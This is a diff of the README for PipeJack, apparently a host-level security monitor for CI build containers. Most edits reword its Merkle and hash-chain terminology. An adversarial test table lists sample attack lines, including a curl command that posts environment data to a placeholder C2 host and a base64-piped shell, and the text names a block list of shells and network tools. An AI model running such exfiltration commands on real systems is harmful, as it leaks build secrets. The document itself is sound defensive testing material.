@@ -43,11 +43,11 @@ Modern build automation systems grant untrusted third-party code broad execution
 
 PipeJack encloses build containers within a host-level, multi-sensor zero-trust observation bubble:
 - **Process Invariants**: Polling `/proc` inside the container cgroup every 150ms to enforce strict binary allowlists.
-- **Filesystem Invariants**: Calculating pre/post SHA-256 Merkle tree baselines across the workspace to block source tampering.
+- **Filesystem Invariants**: Calculating pre/post SHA-256 workspace snapshot integrity baselines across the workspace to detect and block source tampering.
 - **Network Invariants**: Injecting kernel `iptables` chains into container network namespaces to prevent outbound data exfiltration.
 - **Statistical Invariants**: Evaluating z-score telemetry variance against rolling baseline profiles.
 - **Deterministic Gatekeeping**: Policy Decision Point (PDP) automatically routes clean builds to production registries (`ALLOW`) or quarantines compromised builds (`BLOCK`) with HTTP 403 Forbidden.
-- **Cryptographic Provenance**: Every build generates an Ed25519-signed attestation record linked to a SHA-256 Merkle hash chain.
+- **Cryptographic Provenance**: Every build generates an Ed25519-signed attestation record linked into an append-only SHA-256 cryptographic hash chain.
 
 ---
 
@@ -77,7 +77,7 @@ Because compilation inherently involves executing arbitrary code to assemble bin
 | **SCA (Dependency Scanning)** | Dependency Manifests | Checks known CVE databases; incapable of detecting zero-day malicious scripts embedded in brand-new or typosquatted dependency releases. |
 | **Container Image Scanners** | Post-Build Image Tarball | Scans the final resting image layer; blind to transient attacks (e.g., scripts that exfiltrate secrets via `curl` and delete their logs before the image is committed). |
 | **In-Container Security Agents** | Container User Space | Run alongside malicious code inside the container; unprivileged agents cannot stop `root` processes, and can be disabled or bypassed by sophisticated malware. |
-| **PipeJack (Host-Level Sidecar)** | Host Kernel & Cgroups | **Operates outside container namespace**: Watches kernel `/proc`, manages netns `iptables`, and computes Merkle trees from the host. Immune to in-container tampering. |
+| **PipeJack (Host-Level Sidecar)** | Host Kernel & Cgroups | **Operates outside container namespace**: Watches kernel `/proc`, manages netns `iptables`, and computes workspace integrity trees from the host. Immune to in-container tampering. |
 
 ---
 
@@ -103,7 +103,7 @@ PipeJack is architected around a distributed two-VM topology separating develope
 |                                                                                   |
 | 2. Multi-Sensor Security Daemon (`pipejackd`):                                    |
 |    • proctree: 150ms cgroup /proc scanner vs binary allowlist                     |
-|    • fschecker: SHA-256 Merkle tree pre/post workspace diff                      |
+|    • fschecker: SHA-256 workspace snapshot integrity diff                         |
 |    • egressfw + netmon: netns iptables chain + passive /proc/net socket polling   |
 |    • anomaly: z-score statistical variance against 20-build rolling profiles     |
 |                                                                                   |
@@ -131,10 +131,10 @@ PipeJack is architected around a distributed two-VM topology separating develope
 - Intercepts unauthorized interactive shells (`/bin/sh`, `/bin/bash`), network tools (`/usr/bin/curl`, `/usr/bin/wget`), and unapproved interpreters.
 - *Note on Architecture*: Vendored eBPF tracepoint controllers (`core/pipejack/ebpfctrl/`, `netblock/`) are included as architectural kernel prototypes; the active, production-validated daemon uses Linux cgroup v2 `/proc` polling for maximum kernel portability.
 
-### 5.2 Filesystem Merkle Baseline Engine (`fschecker`)
+### 5.2 Filesystem Baseline & Integrity Engine (`fschecker`)
 - **Status**: `IMPLEMENTED & VALIDATED IN PRODUCTION`
 - **Location**: `core/pipejack/fschecker/`
-- Recursively hashes the build workspace prior to execution, computing a canonical SHA-256 Merkle root.
+- Recursively hashes the build workspace prior to execution, computing a canonical SHA-256 root digest over all tracked files.
 - Re-scans post-build and calculates an exact cryptographic diff (`FilesAdded`, `FilesModified`, `FilesDeleted`).
 - Enforces source immutability: compiler outputs (`target/**`, `dist/**`) are allowed; any mutation to source trees (`src/**`, `pom.xml`, `package.json`) triggers immediate quarantine.
 
@@ -187,7 +187,7 @@ enforcement:
 PipeJack provides non-repudiable build provenance through an append-only cryptographic ledger (`services/custom-ci/attest.go`):
 1. **Canonical Build Serialization**: Build metadata, git commit context, sensor telemetry, and PDP verdict are serialized into deterministic JSON.
 2. **SHA-256 Digest (`self_hash`)**: Computed over the canonical record.
-3. **Cryptographic Linking (`prev_hash`)**: Each record includes the `self_hash` of the preceding build, creating an unbroken Merkle hash chain.
+3. **Cryptographic Linking (`prev_hash`)**: Each record includes the `self_hash` of the preceding build, creating an unbroken sequential cryptographic hash chain.
 4. **Digital Signature**: The payload is signed with an asymmetric Ed25519 private key.
 5. **Chain Verification**: Verified 100% intact across 282+ consecutive historical builds using `services/custom-ci/verify-attest.go`.
 
@@ -214,7 +214,7 @@ PipeJack includes a comprehensive adversarial testbed (`attacks/`) replicating r
 | :--- | :--- | :--- | :--- | :--- | :--- |
 | **01** | Shell Execution | `/bin/sh -c "echo attack"` | `proctree` | **BLOCK (403)** | Tagged `<tag>-quarantine`, deployment blocked |
 | **02** | HTTP Exfiltration | `curl -d "env" http://c2:9999` | `proctree` + `egressfw` | **BLOCK (403)** | Outbound packets dropped, quarantined |
-| **03** | Source Tampering | Modification of `src/**/*.java` | `fschecker` | **BLOCK (403)** | Merkle root mismatch, quarantined |
+| **03** | Source Tampering | Modification of `src/**/*.java` | `fschecker` | **BLOCK (403)** | Workspace root digest mismatch, quarantined |
 | **04** | Obfuscated Shell | `echo <base64> \| sh` | `proctree` | **BLOCK (403)** | Kernel `/proc/<pid>/exe` intercepted |
 | **05** | Multi-Stage Dropper | Staged binary in `/tmp/dropper` | `fschecker` + `proctree` | **BLOCK (403)** | Staged execution blocked, quarantined |
 | **06** | Trickling Exfiltration| Low-rate raw socket transmission | `egressfw` + `netmon` | **BLOCK (403)** | Netns SYN packet dropped |
@@ -235,7 +235,8 @@ Detailed in [docs/testing/VALIDATION_REPORT.md](docs/testing/VALIDATION_REPORT.m
 - **Cryptographic Attestation Audit**: **282 / 282 Records Verified (100%)**
   - Zero broken chain links, zero signature verification errors.
 - **Multi-Stack Live Builds**: Clean and malicious builds validated across Java 17, Spring, Node.js 18, and Python 3.12.
-- **Adversarial Suite**: Scenarios 01–06 blocked & quarantined (HTTP 403 Forbidden, 100% prevention); Scenario 07 detected in telemetry & recorded in signed attestation (Advisory default; BLOCK when `anomaly_block: true`).
+- **Adversarial Suite**: Scenarios 01–06 blocked & quarantined (HTTP 403 Forbidden across all evaluated benchmark attacks); Scenario 07 detected in telemetry & recorded in signed attestation (Advisory default; BLOCK when `anomaly_block: true`).
+- **Release Certification Review**: Comprehensive quality gate audit and release scorecard available at [PIPEJACK_FINAL_RELEASE_REVIEW.md](PIPEJACK_FINAL_RELEASE_REVIEW.md).
 
 ---
 
@@ -278,7 +279,7 @@ PipeJack includes an interactive demonstration console running on VM-2 (`http://
 - **Live Pipeline Monitor**: Real-time visualization of container creation, cgroup tracking, and sensor verdicts.
 - **Multi-Application Playground**: Direct interactive testing of deployed microservices (Java Banking API, Spring Calculator AST Engine, Node.js Payment Service, Python Analytics).
 - **Security Lockout Verification**: Dynamically locks application playgrounds when an uploaded build triggers policy quarantine.
-- **Attestation Explorer**: Real-time rendering of Ed25519 signatures and SHA-256 Merkle chain linkages.
+- **Attestation Explorer**: Real-time rendering of Ed25519 signatures and SHA-256 ledger chain linkages.
 
 ---
 
@@ -295,7 +296,7 @@ pipejack-platform/
 │   │   ├── cmd/pipejackd/              # Daemon entrypoint
 │   │   ├── cmd/proctree/               # Standalone process tree differ CLI
 │   │   ├── proctree/                   # Linux cgroup v2 /proc scanner
-│   │   ├── fschecker/                  # SHA-256 Merkle tree baseline engine
+│   │   ├── fschecker/                  # SHA-256 workspace integrity engine
 │   │   ├── internal/egressfw/          # iptables network firewall controller
 │   │   ├── internal/netmon/            # Passive /proc/net socket monitor
 │   │   ├── internal/anomaly/           # Statistical anomaly engine (z-scores)
@@ -305,7 +306,7 @@ pipejack-platform/
 ├── services/                           # CI & Attestation Microservices (VM-2)
 │   └── custom-ci/                      # CI Orchestrator, quarantine, attestation
 │       ├── main.go                     # HTTP server, cgroup discovery, pipeline
-│       ├── attest.go                   # Ed25519 signing & Merkle ledger chaining
+│       ├── attest.go                   # Ed25519 signing & provenance ledger chaining
 │       ├── verify-attest.go            # Cryptographic chain verification tool
 │       └── quarantine_test.go          # Quarantine regression tests
 ├── applications/                       # Production Client Workloads (VM-1)
